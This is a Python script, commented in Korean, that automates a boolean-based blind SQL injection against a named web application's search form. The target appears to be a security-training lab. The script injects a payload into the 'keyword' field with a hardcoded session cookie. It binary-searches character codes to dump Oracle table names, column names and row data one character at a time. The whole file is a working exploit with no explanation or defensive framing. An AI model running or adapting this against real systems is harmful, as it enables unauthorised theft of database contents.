import requests

url = "http://elms1.skinfosec.co.kr:8082/community6/free"
header = {
    "Content-Type" : "application/x-www-form-urlencoded"
}
cookies = { "JSESSIONID" : "101D38BBC27C0F09911272241BBCDF9A" }
data = {
    "startDt" : "",
    "endDt" : "",
    "searchType" : "all",
    "keyword" : "카카오톡%' and {} and 'a%'='a"
}

# 이진 탐색
def binarySearch(query):
    blindquery = "(" + query + ")" + " > {}"
    basedata_keyword = data["keyword"].format(blindquery)

    min = 1
    max = 127
    
    while min < max:
        avg = int((min + max) / 2)
        attackdata = {
            "startDt" : "",
            "endDt" : "",
            "searchType" : "all",
            "keyword" : basedata_keyword.format(avg)
        }

        res = requests.post(url=url, headers=header, cookies=cookies, data=attackdata)

        if '권한' in res.text:
            print("세션 ID 교체!")
            break
        else:
            if '카카오를' in res.text:
                min = avg + 1
            else:
                max = avg

    return min

table_list = []
# 우에엥 column_list = []
# 우에엥 data_list = []

# 총 테이블 개수
query = "select count(table_name) from user_tables"
tableCount = binarySearch(query)
print("테이블 개수: {}".format(tableCount))

# 테이블
for i in range(1, tableCount + 1):
    # 테이블 이름 길이
    query = "select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(i)
    tableLength = binarySearch(query)
    
    table_name = ''
    for j in range(1, tableLength + 1):
        # 테이블 이름 한 글자씩 알아내기
        query = "select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(j, i)
        table_name = table_name + chr(binarySearch(query))

    print("{}번째 테이블 이름: {}".format(i, table_name))

    table_list.append(table_name)


while True:
    # 컬럼과 데이터
    print(table_list)
    table_choice = input("어떤 테이블의 컬럼을 조회하시겠습니까: ")

    if table_choice in table_list:
        # 컬럼 개수 알아내기
        query = "select count(column_name) from user_tab_columns where table_name = '{}'".format(table_choice)
        column_count = binarySearch(query)

        # 컬럼 이름 길이 알아내기
        for i in range(1, column_count + 1):
            query = "select length(column_name) from (select column_name, rownum rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(table_choice, i)
            column_length = binarySearch(query)
        
            # 컬럼 이름 알아내기
            column_name = ''
            for j in range(1, column_length + 1):
                query = "select ascii(substr(column_name, {}, 1)) from (select column_name, rownum rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(j, table_choice, i)
                column_name = column_name + chr(binarySearch(query))
            
            print("{} 테이블의 {}번째 컬럼: {}".format(table_choice, i, column_name))

            # 컬럼 내부 데이터 개수 알아내기
            query = "select count({}) from {}".format(column_name, table_choice)
            data_count = binarySearch(query)

            # 컬럼 내부 데이터 길이 알아내기
            for j in range(1, data_count + 1):
                query = "select length({}) from (select {}, rownum rnum from {}) where rnum = {}".format(column_name, column_name, table_choice, j)
                data_length = binarySearch(query)

                # 컬럼 내부 데이터 알아내기
                data_indata = ''
                for k in range(1, data_length + 1):
                    query = "select ascii(substr({}, {}, 1)) from (select {}, rownum rnum from {}) where rnum = {}".format(column_name, k, column_name, table_choice, j)
                    data_indata = data_indata + chr(binarySearch(query))

                print("{} 테이블의 {}번째 컬럼의 {}번째 데이터: {}".format(table_choice, i, j, data_indata))
    else:
        print("끝.")

        